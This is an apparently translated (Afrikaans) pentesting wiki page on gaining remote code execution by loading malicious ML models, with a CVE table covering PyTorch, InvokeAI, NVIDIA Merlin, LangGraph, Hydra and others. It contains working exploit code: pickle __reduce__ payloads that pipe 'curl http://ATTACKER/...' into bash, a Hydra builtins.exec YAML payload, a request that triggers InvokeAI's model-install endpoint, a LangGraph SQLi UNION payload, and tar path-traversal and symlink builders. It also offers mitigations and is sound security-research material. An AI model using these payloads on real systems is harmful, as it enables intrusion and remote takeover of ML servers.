# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laai om RCE te verkry

Masjienleermodelle word gewoonlik in verskillende formate gedeel, soos ONNX, TensorFlow, PyTorch, ens. Ontwikkelaars kan hierdie modelle op hul masjiene of produksiestelsels laai om dit te gebruik. Modelle behoort gewoonlik nie kwaadwillige kode te bevat nie, maar daar is gevalle waar ’n model gebruik kan word om arbitrêre kode op die stelsel uit te voer, hetsy as ’n bedoelde kenmerk of weens ’n kwesbaarheid in die modellaaibiblioteek.

Die volgende tabel lys verteenwoordigende kwesbaarhede in hierdie kategorie:

| **Raamwerk / hulpmiddel** | **Kwesbaarheid (CVE indien beskikbaar)** | **RCE-vektor** | **Verwysings** |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Onveilige deserialisering in* `torch.load` **(CVE-2025-32434)**                                                              | Kwaadwillige pickle in modelkontrolepunt lei tot kode-uitvoering (omseil die `weights_only`-beskerming)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kwaadwillige modelaflaai veroorsaak kode-uitvoering; Java-deserialisering-RCE in bestuurs-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Onveilige kontrolepunt-deserialisering via `torch.load` **(CVE-2025-23298)**                                           | Onbetroubare kontrolepunt aktiveer pickle reducer tydens `load_model_trainer_states_from_checkpoint` → kode-uitvoering in ML-werker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis-kontrolepuntbestuurders) | SQLi + onveilige MessagePack-uitbreidingshaak **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Gebruikerbeheerde `filter`-sleutel voeg SQL/JSON-pad-sintaksis in, `UNION SELECT` fabriseer ’n vals kontrolepuntry, en dan voer `msgpack`-deserialisering aanvallergekose Python-kode in en roep dit aan | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (onveilige YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Die laai van ’n model vanaf YAML gebruik `yaml.unsafe_load` (kode-uitvoering) <br> Die laai van ’n model met ’n **Lambda**-laag voer arbitrêre Python-kode uit          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-ontleding)                                                                                          | ’n Gespesialiseerde `.tflite`-model veroorsaak heelgetaloorloop → hoopbeskadiging (moontlike RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Die laai van ’n model via `joblib.load` voer pickle uit met aanvaller se `__reduce__`-lading                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (onveilige `np.load`) *betwis*                                                                              | `numpy.load` het by verstek gepicklede objekskikkings toegelaat – kwaadwillige `.npy/.npz` aktiveer kode-uitvoering                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (gidsoorskryding) <br> **CVE-2024-5187** (tar-oorskryding)                                                    | ONNX-model se pad na eksterne gewigte kan uit die gids ontsnap (lees arbitrêre lêers) <br> Kwaadwillige ONNX-model-tar kan arbitrêre lêers oorskryf (wat tot RCE lei) | |
| ONNX Runtime (ontwerprisiko)  | *(Geen CVE)* ONNX-pasgemaakte bewerkings / beheervloei                                                                                    | ’n Model met ’n pasgemaakte bewerking vereis dat aanvaller se oorspronklike kode gelaai word; komplekse modelgrafieke misbruik logika om onbedoelde berekeninge uit te voer   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (pad-oorskryding)                                                                                          | Die gebruik van model-laai-API met `--model-control` geaktiveer laat relatiewe pad-oorskryding toe om lêers te skryf (bv. `.bashrc` oorskryf vir RCE)    | |
| **GGML (GGUF-formaat)**      | **CVE-2024-25664 … 25668** (verskeie hoopoorvloeie)                                                                         | ’n Misvormde GGUF-model lêer veroorsaak hoopbuffer-oorvloeie in die ontleder, wat arbitrêre kode-uitvoering op die slagoffer se stelsel moontlik maak                     | |
| **Keras (ouer formate)**   | *(Geen nuwe CVE)* Verouderde Keras H5-model                                                                                         | Kwaadwillige HDF5 (`.h5`)-model met Lambda-laagkode word steeds tydens laai uitgevoer (Keras `safe_mode` dek nie ou formaat nie – “afgraderingaanval”) | |
| **Ander** (algemeen)        | *Ontwerpfout* – Pickle-serialisering                                                                                         | Baie ML-hulpmiddels (bv. pickle-gebaseerde modelformate, Python `pickle.load`) voer arbitrêre kode uit wat in modelläers ingebed is, tensy dit versag word | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Onbetroubare metadata deurgegee aan `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Aanvallerbeheerde modelmetadata/-konfigurasie stel `_target_` op ’n arbitrêre oproepbare voorwerp (bv. `builtins.exec`) → word tydens laai uitgevoer, selfs met “veilige” formate (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Daarbenewens is daar Python-pickle-gebaseerde modelle, soos dié wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word, wat arbitrêre kode op die stelsel kan uitvoer as hulle nie met `weights_only=True` gelaai word nie. Enige pickle-gebaseerde model kan dus besonder vatbaar wees vir hierdie soort aanvalle, selfs al word dit nie in die tabel hierbo gelys nie.

### Hydra-metadata → RCE (werk selfs met safetensors)

`hydra.utils.instantiate()` voer enige puntgeskeide `_target_` in ’n konfigurasie-/metadata-objek in en roep dit aan. Wanneer biblioteke soos Hugging Face Transformers **onbetroubare modelmetadata** aan `instantiate()` deurgee, kan ’n aanvaller ’n oproepbare voorwerp en argumente verskaf wat onmiddellik tydens modellading uitgevoer word (geen pickle nodig nie).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Voorbeeldlading (werk in `.nemo` `model_config.yaml`, repo `config.json`, of `__metadata__` binne `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Sleutelpunte:
- Word geaktiveer voordat modelinitialisering in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace-coders en FlexTok-loaders plaasvind.
- Hydra se string block-list kan omseil word via alternatiewe import-paaie (bv. `enum.bltns.eval`) of name wat deur die toepassing opgelos word (bv. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok ontleed ook stringified metadata met `ast.literal_eval`, wat DoS (CPU-/geheue-ontploffing) voor die Hydra-aanroep moontlik maak.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is ’n gewilde oopbron-webkoppelvlak vir Stable-Diffusion. Weergawe **5.3.1 – 5.4.2** stel die REST-endpoint `/api/v2/models/install` bloot, wat gebruikers toelaat om modelle van arbitrêre URL’s af te laai en te laai.<sup>[[1]](#references)</sup>

Intern roep die endpoint uiteindelik:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wanneer die verskafde lêer ’n **PyTorch checkpoint (`*.ckpt`)** is, voer `torch.load` ’n **pickle-deserialisering** uit. Omdat die inhoud direk van die gebruikerbeheerde URL af kom, kan ’n aanvaller ’n kwaadwillige objek met ’n pasgemaakte `__reduce__`-metode in die checkpoint insluit; die metode word **tydens deserialisering** uitgevoer, wat lei tot **remote code execution (RCE)** op die InvokeAI-bediener.

Die kwesbaarheid is toegeken **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation-deurloop

1. Skep ’n kwaadwillige checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Huisves `payload.ckpt` op ’n HTTP-bediener wat jy beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Aktiveer die kwesbare endpoint (geen verifikasie nodig nie):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Wanneer InvokeAI die lêer aflaai, roep dit `torch.load()` aan → die `os.system`-gadget loop en die aanvaller verkry kode-uitvoering in die konteks van die InvokeAI-proses.

Klaargemaakte exploit: **Metasploit**-module `exploit/linux/http/invokeai_rce_cve_2024_12029` outomatiseer die hele proses.<sup>[[3]](#references)</sup>

#### Voorwaardes

•  InvokeAI 5.3.1-5.4.2 (scan-vlag is standaard **false**)
•  `/api/v2/models/install` is bereikbaar vir die aanvaller
•  Proses het toestemming om shell-opdragte uit te voer

#### Versagtingsmaatreëls

* Gradeer op na **InvokeAI ≥ 5.4.3** – die patch stel `scan=True` as verstek en skandeer vir malware voordat deserialisering plaasvind.<sup>[[2]](#references)</sup>
* Wanneer checkpoints programmaties gelaai word, gebruik `torch.load(file, weights_only=True)` of die nuwe [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-helper.
* Pas allow-lists / handtekeninge toe vir modelbronne en laat die diens met die minste voorregte loop.

> ⚠️ Onthou dat **enige** Python-pickle-gebaseerde formaat (insluitend baie `.pt`-, `.pkl`-, `.ckpt`- en `.pth`-lêers) inherent onveilig is om vanaf onbetroubare bronne te deserialiseer.

---

Voorbeeld van ’n ad hoc-versagtingsmaatreël indien jy ouer InvokeAI-weergawes agter ’n reverse proxy moet laat loop:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via onveilige `torch.load` (CVE-2025-23298)

NVIDIA se Transformers4Rec (deel van Merlin) het ’n onveilige checkpoint-laaier blootgestel wat `torch.load()` direk op gebruiker-voorsiene paaie aangeroep het. Omdat `torch.load` op Python `pickle` steun, kan ’n aanvallerbeheerde checkpoint arbitrêre kode via ’n reducer tydens deserialisering uitvoer.<sup>[[5]](#references)</sup>

Kwesbare pad (voor die regstelling): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Waarom dit tot RCE lei: In Python pickle kan ’n objek ’n reducer (`__reduce__`/`__setstate__`) definieer wat ’n oproepbare objek en argumente teruggee. Die oproepbare objek word tydens unpickling uitgevoer. As so ’n objek in ’n checkpoint voorkom, word dit uitgevoer voordat enige gewigte gebruik word.

Minimale voorbeeld van ’n kwaadwillige checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Afleweringsvektore en impakgebied:
- Trojanized checkpoints/models wat via repos, buckets of artifact registries gedeel word
- Outomatiese resume/deploy-pipelines wat checkpoints outomaties laai
- Uitvoering vind plaas binne training/inference-workers, dikwels met verhoogde voorregte (bv. root in containers)

Regstelling: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) het die direkte `torch.load()` vervang met ’n beperkte deserializer met ’n toegelate lys, geïmplementeer in `transformers4rec/utils/serialization.py`. Die nuwe loader valideer tipes/velde en voorkom dat arbitrêre callables tydens laai aangeroep word.<sup>[[7]](#references)</sup>

Verdedigingsriglyne spesifiek vir PyTorch-checkpoints:
- Moenie onbetroubare data unpickle nie. Verkies nie-uitvoerbare formate soos [Safetensors](https://huggingface.co/docs/safetensors/index) of ONNX waar moontlik.
- As jy PyTorch-serialisering moet gebruik, maak seker dat `weights_only=True` gestel is (ondersteun in nuwer PyTorch-weergawes), of gebruik ’n pasgemaakte unpickler met ’n toegelate lys, soortgelyk aan die Transformers4Rec-patch.<sup>[[4]](#references)</sup>
- Dwing modelherkoms/-handtekeninge af en sandbox deserialization (seccomp/AppArmor; nie-root-gebruiker; beperkte FS en geen netwerkuitgaande verkeer).
- Monitor vir onverwagte child processes van ML-dienste wanneer checkpoints gelaai word; spoor gebruik van `torch.load()`/`pickle` na.

POC- en kwesbare/patch-verwysings:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Kwesbare loader voor die patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC van kwaadwillige checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader ná die patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Voorbeeld – ’n kwaadwillige PyTorch-model maak

- Skep die model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Laai die model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialisering Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent se FaceDetection-DSFD stel ’n `resnet`-endpoint bloot wat data deserialiseer wat deur die gebruiker beheer word. ZDI het bevestig dat ’n aanvaller op afstand ’n slagoffer kan dwing om ’n kwaadwillige bladsy/lêer te laai, dit ’n aangepaste serialized blob na daardie endpoint kan laat stuur en deserialisering as `root` kan veroorsaak, wat tot volle kompromittering lei.

Die exploit-vloei weerspieël tipiese pickle-misbruik:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Enige gadget wat tydens deserialisering bereikbaar is (konstruktors, `__setstate__`, framework-terugroepe, ens.) kan op dieselfde manier as wapen gebruik word, ongeag of die vervoer HTTP, WebSocket of ’n lêer is wat in ’n gemonitorde gids geplaas is.



### LangGraph checkpointer SQLi → MessagePack RCE

Hierdie aanvalsketting is interessant omdat die aanvaller **nie ’n kwaadwillige modelläer hoef op te laai nie**. In plaas daarvan stel die toepassing ’n **AI-agent-volhardings-API** (`get_state_history(..., filter=...)`) bloot, en bereik gebruikersinvoer die checkpointer se navraagbouer.

#### 1. Strukturele SQLi in metadatafilters

’n Kwesbare SQLite-patroon het soos volg gelyk:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Die waarde word later gebind, maar `query_key` word aaneengeskakel in die **JSON-padstring**, dus laat ’n `'` binne die dictionary-sleutel jou uit `'$.{query_key}'` breek en SQL inspuit. Dieselfde les geld vir **JSON-paaie, identifiseerders, operators, `LIMIT`- en TTL-velde**: plekhouers beskerm slegs waardes, nie strukturele navraag-sintaksis nie.

#### 2. `UNION SELECT` kan daaropvolgende sinks teiken, nie net data steel nie

Die navraag gee `type` en geserialiseerde `checkpoint`-grepe terug, wat later verwerk word as:

```python
self.serde.loads_typed((type, checkpoint))
```

Dit beteken dat 'n SQLi in die `WHERE`-klousule 'n **vals resultaatry** kan inspuit:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

As latere kode enige geselekteerde kolom ontleed, deserialiseer, skryf of uitvoer, karteer daardie kolomme na hul sinks. In hierdie geval verander die vals ry SQLi in **deserialisering wat deur die aanvaller beheer word**.

#### 3. Onveilige MessagePack-uitbreidingshake is gelykstaande aan kodegadgets

LangGraph se `msgpack`-pad het ’n pasgemaakte uitbreidingshaak gebruik wat ’n geneste tupel uitgepak en die volgende uitgevoer het:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

So ’n MessagePack-uitbreidingsobjekkodering van iets wat gelykstaande is aan `("os", "system", "id > /tmp/pwned")` voer `os` in, los `system` op en voer die opdrag uit. Wanneer jy AI-raamwerke nagaan, ondersoek **custom MessagePack/JSON/pickle-herleerders** vir dinamiese invoer, refleksie of arbitrêre oproepbare-aansturing.

#### 4. Praktiese ouditpatroon vir agentraamwerke

Ondersoek enige gebruikerbeheerde invoer wat die volgende bereik:
- toestandgeskiedenis-/geheue-/herspeel-/kontrolepuntlys-API’s
- gestruktureerde filterbouers wat SQL- of Redis-navraagfragmente genereer
- custom deserialiseerders (`pickle`, `msgpack`, `json`-objekhooks, YAML-konstruktors)
- herstelpaaie wat vertrou op rye wat deur die volhardingslaag teruggestuur word

Hierdie spesifieke ketting het selfgehoste LangGraph-ontplooiings met **SQLite**- of **Redis**-kontrolepuntstelsels geraak wanneer onbetroubare gebruikers `filter` kon beheer. Die gepatchte weergawes wat in die bekendmaking vermeld is, was `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` en `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modelle na Path Traversal

Soos in [**hierdie blogplasing**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) genoem word, is die meeste modelformate wat deur verskillende AI-raamwerke gebruik word op argiewe gebaseer, gewoonlik `.zip`-lêers. Daarom kan dit moontlik wees om hierdie formate te misbruik om Path Traversal-aanvalle uit te voer, wat die lees van arbitrêre lêers moontlik maak vanaf die stelsel waarop die model gelaai word.<sup>[[16]](#references)</sup>

Met die volgende kode kan jy byvoorbeeld ’n model skep wat ’n lêer in die `/tmp`-gids sal skep wanneer dit gelaai word:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Of, met die volgende kode kan jy ’n model skep wat ’n symlink na die `/tmp`-gids sal skep wanneer dit gelaai word:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Diepgaande ontleding: Keras .keras-deserialisering en gadget-soektog

Vir ’n gefokusde gids oor .keras-internals, Lambda-layer-RCE, die arbitrêre invoerkwessie in ≤ 3.8 en die ontdekking van gadgets ná die regstelling binne die allowlist, sien:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec-blog – "CVE-2024-12029 – InvokeAI-deserialisering van onbetroubare data"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-patch-commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit-module-dokumentasie](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – Sekuriteitsoorwegings vir torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI-blog – CVE-2025-23298: Kry uitvoering van kode op afstand in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-advies: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-patch-commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Kwesbare loader voor die patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Kwaadwillige checkpoint-PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader ná die patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Uitvoering van kode op afstand met moderne AI/ML-formate en biblioteke](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra-instantiate-dokumentasie](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-block-list-commit (waarskuwing oor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Van SQLi na RCE: Uitbuiting van LangGraph se Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Gebruik Archive Slip-foute as wegspringpunt vir AI/ML-belonings van groot waarde](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
